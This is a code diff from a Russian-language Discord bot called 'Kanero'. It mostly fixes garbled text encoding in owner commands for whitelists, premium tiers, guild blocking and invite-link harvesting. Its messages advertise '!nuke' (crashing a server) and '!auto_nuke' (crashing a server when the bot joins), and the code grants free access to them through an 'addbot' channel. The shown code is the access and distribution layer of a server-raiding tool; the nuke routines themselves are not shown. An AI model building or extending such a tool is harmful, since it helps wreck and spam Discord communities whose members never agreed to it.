-                    "Р—Р°РїСЂРµС‰Р°РµС‚ Р±РѕС‚Сѓ СЂР°Р±РѕС‚Р°С‚СЊ РЅР° СЃРµСЂРІРµСЂРµ вЂ” РЅРёРєС‚Рѕ РёР· РІР°Р№С‚Р»РёСЃС‚Р° РЅРµ СЃРјРѕР¶РµС‚ РёРј РІРѕСЃРїРѕР»СЊР·РѕРІР°С‚СЊСЃСЏ С‚Р°Рј.\n\n"
-                    "`!block_guild <id>` вЂ” Р·Р°Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ\n"
-                    "`!unblock_guild <id>` вЂ” СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ\n"
-                    "`!blocked_guilds` вЂ” СЃРїРёСЃРѕРє Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С…"
+                    "Запрещает боту работать на сервере — никто из вайтлиста не сможет им воспользоваться там.\n\n"
+                    "`!block_guild <id>` — заблокировать\n"
+                    "`!unblock_guild <id>` — разблокировать\n"
+                    "`!blocked_guilds` — список заблокированных"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ‘‘ OWNER WHITELIST",
+                name="?? OWNER WHITELIST",
                 value=(
-                    "`!owl_add <id>` вЂ” РґРѕР±Р°РІРёС‚СЊ\n"
-                    "`!owl_remove <id>` вЂ” СѓР±СЂР°С‚СЊ\n"
-                    "`!owl_list` вЂ” СЃРїРёСЃРѕРє"
+                    "`!owl_add <id>` — добавить\n"
+                    "`!owl_remove <id>` — убрать\n"
+                    "`!owl_list` — список"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ‘ЃпёЏ Р”РћРЎРўРЈРџ (РџРћР”РџРРЎР§РРљР)",
+                name="??? ДОСТУП (ПОДПИСЧИКИ)",
                 value=(
-                    "`!wl_add <id>` вЂ” РІС‹РґР°С‚СЊ РґРѕСЃС‚СѓРї\n"
-                    "`!wl_remove <id>` вЂ” Р·Р°Р±СЂР°С‚СЊ РґРѕСЃС‚СѓРї\n"
-                    "`!wl_list` вЂ” СЃРїРёСЃРѕРє РґРѕРїСѓС‰РµРЅРЅС‹С…"
+                    "`!wl_add <id>` — выдать доступ\n"
+                    "`!wl_remove <id>` — забрать доступ\n"
+                    "`!wl_list` — список допущенных"
                 ),
                 inline=False
             )
-            embed.set_footer(text="в пёЏ Kanero  |  v2.0  |  РљРѕРјР°РЅРґС‹ СЂР°Р±РѕС‚Р°СЋС‚ С‚РѕР»СЊРєРѕ РІ Р›РЎ")
+            embed.set_footer(text="?? Kanero  |  v2.0  |  Команды работают только в ЛС")
             embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
 
-        # !owl_add <id> вЂ” РґРѕР±Р°РІРёС‚СЊ РІ owner whitelist (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !owl_add <id> — добавить в owner whitelist (только OWNER_ID)
         if content.startswith("!owl_add"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ СѓРїСЂР°РІР»СЏС‚СЊ owner whitelist.")
+                await message.channel.send("? Только овнер может управлять owner whitelist.")
                 return
             try:
                 uid = int(content.split()[1])
                 if uid not in config.OWNER_WHITELIST:
                     config.OWNER_WHITELIST.append(uid)
                     save_owner_whitelist()
-                    await message.channel.send(f"вњ… `{uid}` РґРѕР±Р°РІР»РµРЅ РІ owner whitelist.")
+                    await message.channel.send(f"? `{uid}` добавлен в owner whitelist.")
                 else:
-                    await message.channel.send("РЈР¶Рµ РІ owner whitelist.")
+                    await message.channel.send("Уже в owner whitelist.")
             except (ValueError, IndexError):
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!owl_add <id>`")
+                await message.channel.send("Использование: `!owl_add <id>`")
             return
 
-        # !owl_remove <id> вЂ” СѓР±СЂР°С‚СЊ РёР· owner whitelist (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !owl_remove <id> — убрать из owner whitelist (только OWNER_ID)
         if content.startswith("!owl_remove"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ СѓРїСЂР°РІР»СЏС‚СЊ owner whitelist.")
+                await message.channel.send("? Только овнер может управлять owner whitelist.")
                 return
             try:
                 uid = int(content.split()[1])
                 if uid in config.OWNER_WHITELIST:
                     config.OWNER_WHITELIST.remove(uid)
                     save_owner_whitelist()
-                    await message.channel.send(f"вњ… `{uid}` СѓР±СЂР°РЅ РёР· owner whitelist.")
+                    await message.channel.send(f"? `{uid}` убран из owner whitelist.")
                 else:
-                    await message.channel.send("РќРµ РЅР°Р№РґРµРЅ РІ owner whitelist.")
+                    await message.channel.send("Не найден в owner whitelist.")
             except (ValueError, IndexError):
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!owl_remove <id>`")
+                await message.channel.send("Использование: `!owl_remove <id>`")
             return
 
-        # !owl_list вЂ” РїРѕРєР°Р·Р°С‚СЊ owner whitelist (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !owl_list — показать owner whitelist (только OWNER_ID)
         if content == "!owl_list":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ СЃРјРѕС‚СЂРµС‚СЊ owner whitelist.")
+                await message.channel.send("? Только овнер может смотреть owner whitelist.")
                 return
             if not config.OWNER_WHITELIST:
-                await message.channel.send("Owner whitelist РїСѓСЃС‚.")
+                await message.channel.send("Owner whitelist пуст.")
             else:
                 lines = []
                 for uid in config.OWNER_WHITELIST:
                     try:
                         user = await bot.fetch_user(uid)
-                        lines.append(f"`{uid}` вЂ” **{user}**")
+                        lines.append(f"`{uid}` — **{user}**")
                     except Exception:
-                        lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-                embed = discord.Embed(title="рџ‘‘ Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(config.OWNER_WHITELIST)}")
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="?? Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"?? Kanero  |  Всего: {len(config.OWNER_WHITELIST)}")
                 await message.channel.send(embed=embed)
             return
 
-        # !guilds вЂ” РїРѕРєР°Р·Р°С‚СЊ СЃРїРёСЃРѕРє СЃРµСЂРІРµСЂРѕРІ СЃ РєРЅРѕРїРєР°РјРё РІС‹Р±РѕСЂР°
+        # !guilds — показать список серверов с кнопками выбора
         if content == "!guilds":
             guilds = list(bot.guilds)
             if not guilds:
-                await message.channel.send("Р‘РѕС‚ РЅРµ РЅР° СЃРµСЂРІРµСЂР°С….")
+                await message.channel.send("Бот не на серверах.")
                 return
-            lines = "\n".join(f"`{g.id}` вЂ” {g.name}" for g in guilds)
+            lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
             view = GuildSelectView(guilds, message.author.id)
             current = active_guild.get(message.author.id)
-            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "РЅРµ РІС‹Р±СЂР°РЅ"
+            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "не выбран"
             await message.channel.send(
-                f"РЎРµСЂРІРµСЂС‹ Р±РѕС‚Р° (Р°РєС‚РёРІРЅС‹Р№: **{current_name}**):\n{lines}\n\nР’С‹Р±РµСЂРё СЃРµСЂРІРµСЂ РєРЅРѕРїРєРѕР№:",
+                f"Серверы бота (активный: **{current_name}**):\n{lines}\n\nВыбери сервер кнопкой:",
                 view=view
             )
             return
 
-        # !invlink вЂ” РїСЂРёСЃР»Р°С‚СЊ РёРЅРІР°Р№С‚-СЃСЃС‹Р»РєРё СЃРѕ РІСЃРµС… СЃРµСЂРІРµСЂРѕРІ
+        # !invlink — прислать инвайт-ссылки со всех серверов
         if content == "!invlink":
             if not bot.guilds:
-                await message.channel.send("Р‘РѕС‚ РЅРµ РЅР° СЃРµСЂРІРµСЂР°С….")
+                await message.channel.send("Бот не на серверах.")
                 return
             lines = []
             for g in bot.guilds:
@@ -5479,156 +5479,156 @@ async def on_message(message):
                     ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                     if ch:
                         inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
-                        lines.append(f"**{g.name}** вЂ” {inv.url}")
+                        lines.append(f"**{g.name}** — {inv.url}")
                     else:
-                        lines.append(f"**{g.name}** вЂ” РЅРµС‚ РїСЂР°РІ РЅР° СЃРѕР·РґР°РЅРёРµ РёРЅРІР°Р№С‚Р°")
+                        lines.append(f"**{g.name}** — нет прав на создание инвайта")
                 except Exception as e:
-                    lines.append(f"**{g.name}** вЂ” РѕС€РёР±РєР°: {e}")
+                    lines.append(f"**{g.name}** — ошибка: {e}")
             await message.channel.send("\n".join(lines))
             return
 
-        # !setguild <id> вЂ” РІС‹Р±СЂР°С‚СЊ СЃРµСЂРІРµСЂ РІСЂСѓС‡РЅСѓСЋ РїРѕ ID
+        # !setguild <id> — выбрать сервер вручную по ID
         if content.startswith("!setguild "):
             try:
                 gid = int(content.split()[1])
                 guild = bot.get_guild(gid)
                 if not guild:
-                    await message.channel.send("РЎРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+                    await message.channel.send("Сервер не найден.")
                     return
                 active_guild[message.author.id] = gid
-                await message.channel.send(f"вњ… РђРєС‚РёРІРЅС‹Р№ СЃРµСЂРІРµСЂ: **{guild.name}**")
+                await message.channel.send(f"? Активный сервер: **{guild.name}**")
             except (ValueError, IndexError):
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!setguild <id>`")
+                await message.channel.send("Использование: `!setguild <id>`")
             return
 
-        # !block_guild [id] вЂ” Р·Р°Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !block_guild [id] — заблокировать сервер (только OWNER_ID)
         if content.startswith("!block_guild"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             parts = content.split()
             try:
                 gid = int(parts[1]) if len(parts) > 1 else None
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!block_guild <id>`")
+                await message.channel.send("Использование: `!block_guild <id>`")
                 return
             if not gid:
-                await message.channel.send("РЈРєР°Р¶Рё ID СЃРµСЂРІРµСЂР°: `!block_guild <id>`")
+                await message.channel.send("Укажи ID сервера: `!block_guild <id>`")
                 return
             if gid not in BLOCKED_GUILDS:
                 BLOCKED_GUILDS.append(gid)
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"рџ”’ РЎРµСЂРІРµСЂ {name_str} Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ. Р‘РѕС‚ РЅРµ Р±СѓРґРµС‚ РІС‹РїРѕР»РЅСЏС‚СЊ РєРѕРјР°РЅРґС‹ РЅР° РЅС‘Рј.")
+                await message.channel.send(f"?? Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
             else:
-                await message.channel.send("РЎРµСЂРІРµСЂ СѓР¶Рµ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send("Сервер уже заблокирован.")
             return
 
-        # !unblock_guild [id] вЂ” СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !unblock_guild [id] — разблокировать сервер (только OWNER_ID)
         if content.startswith("!unblock_guild"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             parts = content.split()
             try:
                 gid = int(parts[1]) if len(parts) > 1 else None
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!unblock_guild <id>`")
+                await message.channel.send("Использование: `!unblock_guild <id>`")
                 return
             if not gid:
-                await message.channel.send("РЈРєР°Р¶Рё ID СЃРµСЂРІРµСЂР°: `!unblock_guild <id>`")
+                await message.channel.send("Укажи ID сервера: `!unblock_guild <id>`")
                 return
             if gid in BLOCKED_GUILDS:
                 BLOCKED_GUILDS.remove(gid)
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"рџ”“ РЎРµСЂРІРµСЂ {name_str} СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send(f"?? Сервер {name_str} разблокирован.")
             else:
-                await message.channel.send("РЎРµСЂРІРµСЂ РЅРµ Р±С‹Р» Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send("Сервер не был заблокирован.")
             return
 
-        # !blocked_guilds вЂ” СЃРїРёСЃРѕРє Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С… СЃРµСЂРІРµСЂРѕРІ (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !blocked_guilds — список заблокированных серверов (только OWNER_ID)
         if content == "!blocked_guilds":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             if not BLOCKED_GUILDS:
-                await message.channel.send("РќРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С… СЃРµСЂРІРµСЂРѕРІ.")
+                await message.channel.send("Нет заблокированных серверов.")
             else:
                 lines = []
                 for gid in BLOCKED_GUILDS:
                     g = bot.get_guild(gid)
-                    lines.append(f"`{gid}` вЂ” {g.name if g else 'РЅРµРёР·РІРµСЃС‚РµРЅ'}")
-                await message.channel.send("рџ”’ Р—Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹Рµ СЃРµСЂРІРµСЂС‹:\n" + "\n".join(lines))
+                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
+                await message.channel.send("?? Заблокированные серверы:\n" + "\n".join(lines))
             return
 
-        # !pm_add <id> вЂ” РІС‹РґР°С‚СЊ premium (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !pm_add <id> — выдать premium (только OWNER_ID)
         if content.startswith("!pm_add"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             parts = content.split()
             try:
                 uid = int(parts[1]) if len(parts) > 1 else None
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!pm_add <id>`")
+                await message.channel.send("Использование: `!pm_add <id>`")
                 return
             if not uid:
-                await message.channel.send("РЈРєР°Р¶Рё ID: `!pm_add <id>`")
+                await message.channel.send("Укажи ID: `!pm_add <id>`")
                 return
             if uid not in PREMIUM_LIST:
                 PREMIUM_LIST.append(uid)
                 save_premium()
-                await message.channel.send(f"рџ’Ћ `{uid}` РїРѕР»СѓС‡РёР» **Premium** вЂ” РєР°СЃС‚РѕРјРЅС‹Р№ С‚РµРєСЃС‚ РґР»СЏ `!nuke` СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send(f"?? `{uid}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
             else:
-                await message.channel.send("РЈР¶Рµ РІ Premium.")
+                await message.channel.send("Уже в Premium.")
             return
 
-        # !pm_remove <id> вЂ” Р·Р°Р±СЂР°С‚СЊ premium (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !pm_remove <id> — забрать premium (только OWNER_ID)
         if content.startswith("!pm_remove"):
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             parts = content.split()
             try:
                 uid = int(parts[1]) if len(parts) > 1 else None
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!pm_remove <id>`")
+                await message.channel.send("Использование: `!pm_remove <id>`")
                 return
             if not uid:
-                await message.channel.send("РЈРєР°Р¶Рё ID: `!pm_remove <id>`")
+                await message.channel.send("Укажи ID: `!pm_remove <id>`")
                 return
             if uid in PREMIUM_LIST:
                 PREMIUM_LIST.remove(uid)
                 save_premium()
-                await message.channel.send(f"вњ… `{uid}` СѓР±СЂР°РЅ РёР· Premium.")
+                await message.channel.send(f"? `{uid}` убран из Premium.")
             else:
-                await message.channel.send("РќРµ РЅР°Р№РґРµРЅ РІ Premium.")
+                await message.channel.send("Не найден в Premium.")
             return
 
-        # !pm_list вЂ” СЃРїРёСЃРѕРє premium (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !pm_list — список premium (только OWNER_ID)
         if content == "!pm_list":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             if not PREMIUM_LIST:
-                await message.channel.send("Premium СЃРїРёСЃРѕРє РїСѓСЃС‚.")
+                await message.channel.send("Premium список пуст.")
             else:
                 lines = []
                 for uid in PREMIUM_LIST:
                     try:
                         user = await bot.fetch_user(uid)
-                        lines.append(f"`{uid}` вЂ” **{user}**")
+                        lines.append(f"`{uid}` — **{user}**")
                     except Exception:
-                        lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-                embed = discord.Embed(title="рџ’Ћ Premium СЃРїРёСЃРѕРє", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(PREMIUM_LIST)}")
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="?? Premium список", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"?? Kanero  |  Всего: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
             return
 
-        # Р›СЋР±Р°СЏ РґСЂСѓРіР°СЏ РєРѕРјР°РЅРґР° вЂ” РІС‹РїРѕР»РЅСЏРµРј РЅР° Р°РєС‚РёРІРЅРѕРј СЃРµСЂРІРµСЂРµ
+        # Любая другая команда — выполняем на активном сервере
         DM_ONLY_COMMANDS = (
             "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
             "!owl_add", "!owl_remove", "!owl_list",
@@ -5639,27 +5639,27 @@ async def on_message(message):
             return
 
         if content.startswith("!") and content != "!":
-            # РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ РјРѕР¶РµС‚ РІС‹РїРѕР»РЅСЏС‚СЊ РєРѕРјР°РЅРґС‹ С‡РµСЂРµР· Р›РЎ
+            # Только овнер может выполнять команды через ЛС
             if message.author.id != config.OWNER_ID:
                 await message.channel.send(embed=discord.Embed(
-                    description="вќЊ РљРѕРјР°РЅРґС‹ РІ Р›РЎ РґРѕСЃС‚СѓРїРЅС‹ С‚РѕР»СЊРєРѕ РѕРІРЅРµСЂСѓ.",
+                    description="? Команды в ЛС доступны только овнеру.",
                     color=0x0a0a0a
                 ))
                 return
-            # РЎРЅР°С‡Р°Р»Р° РїСЂРѕР±СѓРµРј Р°РєС‚РёРІРЅС‹Р№ СЃРµСЂРІРµСЂ, РёРЅР°С‡Рµ вЂ” РґРѕРјР°С€РЅРёР№
+            # Сначала пробуем активный сервер, иначе — домашний
             gid = active_guild.get(message.author.id) or HOME_GUILD_ID
             guild = bot.get_guild(gid)
             if not guild:
-                await message.channel.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµРґРѕСЃС‚СѓРїРµРЅ.")
+                await message.channel.send("? Домашний сервер недоступен.")
                 return
             await run_dm_command(message, guild, content)
             return
 
-    # в”Ђв”Ђ РћР±С‹С‡РЅР°СЏ РѕР±СЂР°Р±РѕС‚РєР° РЅР° СЃРµСЂРІРµСЂРµ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+    # -- Обычная обработка на сервере ------------------------
     if message.guild and is_guild_blocked(message.guild.id):
-        return  # РЎРµСЂРІРµСЂ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ вЂ” РёРіРЅРѕСЂРёСЂСѓРµРј РІСЃС‘
+        return  # Сервер заблокирован — игнорируем всё
 
-    # в”Ђв”Ђ Р‘Р»РѕРєРёСЂРѕРІРєР° РєРѕРјР°РЅРґ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ РґР»СЏ РЅРµ-РѕРІРЅРµСЂРѕРІ в”Ђв”Ђ
+    # -- Блокировка команд на домашнем сервере для не-овнеров --
     if (message.guild and message.guild.id == HOME_GUILD_ID
             and message.content.startswith("!")
             and not message.author.bot
@@ -5672,15 +5672,15 @@ async def on_message(message):
         try:
             await message.author.send(
                 embed=discord.Embed(
-                    description="в пёЏ РљРѕРјР°РЅРґС‹ РЅР° РЅР°С€РµРј СЃРµСЂРІРµСЂРµ РЅРµ СЂР°Р±РѕС‚Р°СЋС‚.\nР”РѕР±Р°РІСЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ Рё РёСЃРїРѕР»СЊР·СѓР№ С‚Р°Рј.",
+                    description="?? Команды на нашем сервере не работают.\nДобавь бота на свой сервер и используй там.",
                     color=0x0a0a0a
-                ).set_footer(text="в пёЏ Kanero")
+                ).set_footer(text="?? Kanero")
             )
         except Exception:
             pass
         return
 
-    # в”Ђв”Ђ РљР°РЅР°Р» addbot РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ вЂ” РІС‹РґР°С‘Рј freelist в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+    # -- Канал addbot на домашнем сервере — выдаём freelist ----------------------
     if (message.guild and message.guild.id == HOME_GUILD_ID
             and ("addbot" in message.channel.name.lower())
             and not message.author.bot):
@@ -5695,10 +5695,10 @@ async def on_message(message):
             try:
                 await message.author.send(
                     embed=discord.Embed(
-                        title="вњ… РЈ С‚РµР±СЏ СѓР¶Рµ РµСЃС‚СЊ Р±Р°Р·РѕРІС‹Р№ РґРѕСЃС‚СѓРї",
+                        title="? У тебя уже есть базовый доступ",
                         description=(
-                            "РўС‹ СѓР¶Рµ РІ freelist вЂ” РјРѕР¶РµС€СЊ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ `!nuke` Рё `!auto_nuke`.\n\n"
-                            "Р”Р»СЏ СЂР°СЃС€РёСЂРµРЅРЅРѕРіРѕ РґРѕСЃС‚СѓРїР° РЅР°РїРёС€Рё: **davaidkatt**"
+                            "Ты уже в freelist — можешь использовать `!nuke` и `!auto_nuke`.\n\n"
+                            "Для расширенного доступа напиши: **davaidkatt**"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
@@ -5708,7 +5708,7 @@ async def on_message(message):
         else:
             FREELIST.append(uid)
             save_freelist()
-            # Р’С‹РґР°С‘Рј СЂРѕР»СЊ рџ‘Ґ User РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+            # Выдаём роль ?? User на домашнем сервере
             try:
                 home_guild = bot.get_guild(HOME_GUILD_ID)
                 if home_guild:
@@ -5716,24 +5716,24 @@ async def on_message(message):
                     if not member:
                         member = await home_guild.fetch_member(uid)
                     if member:
-                        user_role = discord.utils.find(lambda r: r.name == "рџ‘Ґ User", home_guild.roles)
+                        user_role = discord.utils.find(lambda r: r.name == "?? User", home_guild.roles)
                         if user_role:
-                            await member.add_roles(user_role, reason="Freelist вЂ” РЅР°РїРёСЃР°Р» РІ addbot")
+                            await member.add_roles(user_role, reason="Freelist — написал в addbot")
             except Exception:
                 pass
             try:
                 await message.author.send(
                     embed=discord.Embed(
-                        title="вњ… Р‘Р°Р·РѕРІС‹Р№ РґРѕСЃС‚СѓРї РїРѕР»СѓС‡РµРЅ!",
+                        title="? Базовый доступ получен!",
                         description=(
-                            "РўС‹ РґРѕР±Р°РІР»РµРЅ РІ freelist Рё РїРѕР»СѓС‡РёР» СЂРѕР»СЊ **рџ‘Ґ User**.\n\n"
-                            "**Р”РѕСЃС‚СѓРїРЅС‹Рµ РєРѕРјР°РЅРґС‹:**\n"
-                            "`!nuke` вЂ” РєСЂР°С€ СЃРµСЂРІРµСЂР°\n"
-                            "`!auto_nuke on/off` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ Р±РѕС‚Р°\n"
-                            "`!help` вЂ” СЃРїРёСЃРѕРє РєРѕРјР°РЅРґ\n"
-                            "`!changelog` / `!changelogall` вЂ” РёСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№\n\n"
-                            "Р”Р»СЏ White/Premium РЅР°РїРёС€Рё: **davaidkatt** | **@Firisotik**\n\n"
-                            "РќР°С€ СЃРµСЂРІРµСЂ: https://discord.gg/aud6wwYVRd"
+                            "Ты добавлен в freelist и получил роль **?? User**.\n\n"
+                            "**Доступные команды:**\n"
+                            "`!nuke` — краш сервера\n"
+                            "`!auto_nuke on/off` — авто-краш при входе бота\n"
+                            "`!help` — список команд\n"
+                            "`!changelog` / `!changelogall` — история обновлений\n\n"
+                            "Для White/Premium напиши: **davaidkatt** | **@Firisotik**\n\n"
+                            "Наш сервер: https://discord.gg/nNTB37QNCG"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
@@ -5746,9 +5746,9 @@ async def on_message(message):
         await help_cmd(ctx)
         return
     await bot.process_commands(message)
-    # Р›РѕРіРёСЂСѓРµРј С‚РѕР»СЊРєРѕ РµСЃР»Рё СЌС‚Рѕ РєРѕРјР°РЅРґР° (РЅР°С‡РёРЅР°РµС‚СЃСЏ СЃ !)
+    # Логируем только если это команда (начинается с !)
     if message.content.startswith("!"):
-        log.info("РљРѕРјР°РЅРґР° РѕС‚ %s (%s) РЅР° СЃРµСЂРІРµСЂРµ %s: %s", message.author, message.author.id, message.guild, message.content)
+        log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)
 
 
 @bot.event
@@ -5758,7 +5758,7 @@ async def on_ready():
     global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
     global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST, FREELIST
 
-    # в”Ђв”Ђ Р—Р°РіСЂСѓР·РєР° РёР· MongoDB в”Ђв”Ђ
+    # -- Загрузка из MongoDB --
     wl = await db_get("data", "whitelist")
     if wl is not None:
         config.WHITELIST = wl
@@ -5771,7 +5771,7 @@ async def on_ready():
     pm = await db_get("data", "premium")
     if pm is not None:
         PREMIUM_LIST = pm
-    # spam_text РІСЃРµРіРґР° Р±РµСЂС‘С‚СЃСЏ РёР· config.py (РЅРµ РїРµСЂРµР·Р°РїРёСЃС‹РІР°РµС‚СЃСЏ РёР· MongoDB)
+    # spam_text всегда берётся из config.py (не перезаписывается из MongoDB)
     asn = await db_get("data", "auto_super_nuke")
     if asn is not None:
         AUTO_SUPER_NUKE = asn.get("enabled", False)
@@ -5796,42 +5796,60 @@ async def on_ready():
     if fl is not None:
         FREELIST = fl
     
-    # Р—Р°РіСЂСѓР·РєР° СЃРїРёСЃРєР° С‚РµСЃС‚РµСЂРѕРІ
+    # Загрузка списка тестеров
     tl = await db_get("data", "tester_list")
     if tl is not None:
         TESTER_LIST = tl
     
-    # Р—Р°РіСЂСѓР·РєР° РІСЂРµРјРµРЅРЅС‹С… РїРѕРґРїРёСЃРѕРє
+    # Загрузка временных подписок
     await load_temp_subscriptions()
 
-    # в”Ђв”Ђ Р РµРіРёСЃС‚СЂРёСЂСѓРµРј persistent views (РєРЅРѕРїРєРё РІС‹Р¶РёРІР°СЋС‚ РїРѕСЃР»Рµ РїРµСЂРµР·Р°РїСѓСЃРєР°) в”Ђв”Ђ
+    # -- Регистрируем persistent views (кнопки выживают после перезапуска) --
     bot.add_view(TicketCloseView())
     bot.add_view(TicketOpenView())
-    # CompensationView вЂ” РѕРґРёРЅ СЌРєР·РµРјРїР»СЏСЂ, custom_id="claim_comp_v2" РїРѕРєСЂС‹РІР°РµС‚ РІСЃРµ С‚РёРїС‹
+    # CompensationView — один экземпляр, custom_id="claim_comp_v2" покрывает все типы
     bot.add_view(CompensationView("pm", 24, datetime.utcnow() + timedelta(days=365)))
 
     bot.tree.clear_commands(guild=None)
 
-    print(f"Р‘РѕС‚ Р·Р°РїСѓС‰РµРЅ РєР°Рє {bot.user}")
+    print(f"Бот запущен как {bot.user}")
 
-    print(f"Р‘РѕС‚ Р·Р°РїСѓС‰РµРЅ РєР°Рє {bot.user}")
+    print(f"Бот запущен как {bot.user}")
 
 
 @bot.event
 async def on_command_error(ctx, error):
